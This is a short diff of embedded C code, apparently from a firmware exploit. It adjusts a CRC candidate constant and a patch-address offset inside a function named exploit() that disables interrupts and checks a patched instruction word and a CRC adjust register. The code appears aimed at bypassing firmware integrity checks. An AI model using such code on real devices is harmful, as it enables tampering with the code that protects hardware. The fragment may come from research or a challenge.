@@ -4,7 +4,7 @@
 #include "crc_runtime.h"
 
 #define ORIGINAL_ADJUST 0x0962887Fu
-#define CRC_CANDIDATE_ADJUST 0x414F47CCu
+#define CRC_CANDIDATE_ADJUST 0x41C90FF2u
 #define CRC_MAGIC_OFFSET 0x7E00u
 
 void exploit(void) __attribute__((section(".text.entry"),used,noreturn));
@@ -22,8 +22,8 @@ void exploit(void) {
 
   __asm__ volatile ("di");
   runtime_begin(&guard);
-  if (MMIO32(PATCH_ADDRESS - 2u) != PATCHED_INSTRUCTION_WORD) {
-    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 1u, MMIO32(PATCH_ADDRESS - 2u), &guard);
+  if (MMIO32(PATCH_ADDRESS - 3u) != PATCHED_INSTRUCTION_WORD) {
+    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 1u, MMIO32(PATCH_ADDRESS - 3u), &guard);
   }
   if (MMIO32(CRC_ADJUST) != ORIGINAL_ADJUST) {
     halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 2u, MMIO32(CRC_ADJUST), &guard);
